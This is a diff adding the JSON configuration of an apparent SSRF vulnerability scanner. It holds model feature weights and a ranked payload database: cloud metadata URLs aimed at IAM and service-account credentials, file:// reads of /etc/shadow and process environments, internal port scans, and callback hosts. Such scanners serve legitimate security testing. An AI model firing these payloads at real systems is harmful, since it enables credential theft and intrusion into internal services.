@@ -1,0 +1,310 @@
+{
+  "model_info": {
+    "name": "SSRF Detector XGBoost",
+    "version": "1.0",
+    "algorithm": "GradientBoosting (XGBoost)",
+    "accuracy": 1.0,
+    "created": "2026-02-10"
+  },
+  
+  "features": [
+    "param_url",
+    "param_webhook",
+    "param_fetch",
+    "endpoint_api",
+    "endpoint_fetch",
+    "endpoint_proxy",
+    "endpoint_webhook",
+    "is_https",
+    "requires_auth",
+    "method_post"
+  ],
+  
+  "decision_rules": [
+    {
+      "feature": "param_url",
+      "importance": 0.2658,
+      "weight": 0.30,
+      "description": "Parameter contiene 'url' - señal más fuerte"
+    },
+    {
+      "feature": "endpoint_api",
+      "importance": 0.1211,
+      "weight": 0.15,
+      "description": "Endpoint contiene '/api/'"
+    },
+    {
+      "feature": "param_webhook",
+      "importance": 0.1058,
+      "weight": 0.12,
+      "description": "Parameter contiene 'webhook'"
+    },
+    {
+      "feature": "requires_auth",
+      "importance": 0.1082,
+      "weight": -0.11,
+      "description": "Requiere autenticación (negativo = sin auth más vulnerable)"
+    },
+    {
+      "feature": "endpoint_fetch",
+      "importance": 0.0800,
+      "weight": 0.10,
+      "description": "Endpoint contiene 'fetch' o 'download'"
+    },
+    {
+      "feature": "endpoint_webhook",
+      "importance": 0.1058,
+      "weight": 0.08,
+      "description": "Endpoint contiene 'webhook'"
+    },
+    {
+      "feature": "is_https",
+      "importance": 0.0560,
+      "weight": -0.06,
+      "description": "HTTPS (negativo = HTTP más vulnerable)"
+    },
+    {
+      "feature": "method_post",
+      "importance": 0.0304,
+      "weight": 0.05,
+      "description": "Método POST"
+    }
+  ],
+  
+  "threshold": 0.5,
+  
+  "payload_database": {
+    "localhost": {
+      "priority": "HIGH",
+      "success_rate": 0.37,
+      "count": 11,
+      "total": 30,
+      "payloads": [
+        "http://localhost/admin",
+        "http://127.0.0.1/admin",
+        "http://localhost:8080/admin",
+        "http://localhost:3000/admin",
+        "http://0.0.0.0/admin",
+        "http://[::1]/admin",
+        "http://127.0.0.1:80/admin",
+        "http://localhost/internal",
+        "http://127.1/admin",
+        "http://0/admin",
+        "http://127.0.0.1:8080/config"
+      ],
+      "description": "Acceso a interfaces administrativas locales",
+      "impact": "Access to internal admin panels"
+    },
+    
+    "aws_metadata": {
+      "priority": "CRITICAL",
+      "success_rate": 0.27,
+      "count": 8,
+      "total": 30,
+      "payloads": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/user-data/",
+        "http://169.254.169.254/latest/dynamic/instance-identity/",
+        "http://169.254.169.254/2021-07-15/meta-data/",
+        "http://169.254.169.254/latest/meta-data/hostname",
+        "http://169.254.169.254/latest/meta-data/public-ipv4",
+        "http://169.254.169.254/latest/meta-data/iam/info"
+      ],
+      "description": "AWS Instance Metadata Service - credenciales IAM",
+      "impact": "Steal AWS credentials and secrets"
+    },
+    
+    "private_network": {
+      "priority": "MEDIUM",
+      "success_rate": 0.07,
+      "count": 2,
+      "total": 30,
+      "payloads": [
+        "http://192.168.1.1",
+        "http://192.168.0.1",
+        "http://10.0.0.1",
+        "http://172.16.0.1",
+        "http://192.168.1.254",
+        "http://10.0.0.254",
+        "http://172.31.0.1"
+      ],
+      "description": "Escaneo de red interna privada",
+      "impact": "Internal network enumeration"
+    },
+    
+    "gcp_metadata": {
+      "priority": "CRITICAL",
+      "success_rate": 0.03,
+      "count": 1,
+      "total": 30,
+      "payloads": [
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://metadata/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+      ],
+      "description": "Google Cloud Platform metadata service",
+      "impact": "Access GCP credentials"
+    },
+    
+    "azure_metadata": {
+      "priority": "CRITICAL",
+      "success_rate": 0.0,
+      "count": 0,
+      "total": 30,
+      "payloads": [
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      ],
+      "description": "Azure Instance Metadata Service",
+      "impact": "Access Azure credentials"
+    },
+    
+    "alibaba_metadata": {
+      "priority": "MEDIUM",
+      "success_rate": 0.0,
+      "count": 0,
+      "total": 30,
+      "payloads": [
+        "http://100.100.100.200/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/instance-id"
+      ],
+      "description": "Alibaba Cloud metadata service",
+      "impact": "Access Alibaba Cloud metadata"
+    },
+    
+    "port_scan": {
+      "priority": "MEDIUM",
+      "success_rate": null,
+      "count": 0,
+      "total": 30,
+      "payloads": [
+        "http://localhost:22",
+        "http://localhost:3306",
+        "http://localhost:6379",
+        "http://localhost:5432",
+        "http://localhost:9200",
+        "http://localhost:27017",
+        "http://localhost:11211",
+        "http://127.0.0.1:3389",
+        "http://127.0.0.1:445"
+      ],
+      "description": "Port scanning via timing differences",
+      "impact": "Enumerate internal services"
+    },
+    
+    "file_access": {
+      "priority": "HIGH",
+      "success_rate": null,
+      "count": 0,
+      "total": 30,
+      "payloads": [
+        "file:///etc/passwd",
+        "file:///etc/hosts",
+        "file:///proc/self/environ",
+        "file:///c:/windows/win.ini",
+        "file:///etc/shadow"
+      ],
+      "description": "Local file access via file:// protocol",
+      "impact": "Read local files"
+    },
+    
+    "oob": {
+      "priority": "LOW",
+      "success_rate": null,
+      "count": 0,
+      "total": 30,
+      "payloads": [
+        "http://burpcollaborator.net",
+        "http://webhook.site/unique-id",
+        "http://pingb.in/unique-id",
+        "https://canarytokens.com/unique-id"
+      ],
+      "description": "Out-of-band detection for blind SSRF",
+      "impact": "Confirm SSRF via callback"
+    }
+  },
+  
+  "feature_extraction_rules": {
+    "param_url": {
+      "pattern": ["url", "uri", "link"],
+      "location": "parameter_name"
+    },
+    "param_webhook": {
+      "pattern": ["webhook", "hook", "callback"],
+      "location": "parameter_name"
+    },
+    "param_fetch": {
+      "pattern": ["fetch", "stock", "get", "retrieve"],
+      "location": "parameter_name"
+    },
+    "endpoint_api": {
+      "pattern": ["/api/"],
+      "location": "url_path"
+    },
+    "endpoint_fetch": {
+      "pattern": ["fetch", "download", "import", "get"],
+      "location": "url_path"
+    },
+    "endpoint_proxy": {
+      "pattern": ["proxy"],
+      "location": "url_path"
+    },
+    "endpoint_webhook": {
+      "pattern": ["webhook", "hook", "callback"],
+      "location": "url_path"
+    },
+    "is_https": {
+      "pattern": ["https://"],
+      "location": "url_protocol"
+    },
+    "requires_auth": {
+      "check": "authentication_required",
+      "location": "request_metadata"
+    },
+    "method_post": {
+      "check": "method == POST",
+      "location": "http_method"
+    }
+  },
+  
+  "usage_examples": [
+    {
+      "name": "Basic URL fetch",
+      "request": {
+        "url": "http://site.com/fetch?url=***",
+        "method": "GET",
+        "parameter_name": "url",
+        "requires_auth": false
+      },
+      "expected_result": "VULNERABLE",
+      "expected_confidence": 0.88,
+      "top_payload": "http://localhost/admin"
+    },
+    {
+      "name": "Webhook validator",
+      "request": {
+        "url": "http://api.site.com/webhooks/validate?webhookUrl=***",
+        "method": "GET",
+        "parameter_name": "webhookUrl",
+        "requires_auth": false
+      },
+      "expected_result": "VULNERABLE",
+      "expected_confidence": 0.85,
+      "top_payload": "http://169.254.169.254/latest/meta-data/"
+    },
+    {
+      "name": "Benign API",
+      "request": {
+        "url": "https://api.github.com/users/octocat/repos?page=1",
+        "method": "GET",
+        "parameter_name": "page",
+        "requires_auth": true
+      },
+      "expected_result": "SAFE",
+      "expected_confidence": 0.30,
+      "top_payload": null
+    }
+  ]
+}
